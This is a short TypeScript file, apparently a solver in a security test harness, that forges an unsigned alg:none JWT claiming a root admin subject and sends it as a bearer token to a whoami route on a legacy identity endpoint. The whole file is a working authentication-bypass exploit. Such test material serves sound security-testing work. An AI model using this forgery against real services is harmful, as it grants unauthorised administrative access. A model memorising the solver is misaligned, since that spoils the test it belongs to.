// Token forgery against the legacy v1 identity endpoint: craft an unsigned alg:none assertion claiming
// an admin subject and present it as the bearer token.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

const seg = (o: unknown): string => Buffer.from(JSON.stringify(o)).toString('base64url')

export async function solve(ctx: SolverCtx): Promise<void> {
  const token = `${seg({ alg: 'none', typ: 'JWT' })}.${seg({ sub: 'root', team: 'any', role: 'admin' })}.`
  await ctx.fetch(ctx.plan.routes.apiWhoami!.path, {
    method: 'GET',
    headers: { authorization: `Bearer ${token}` },
  })
}
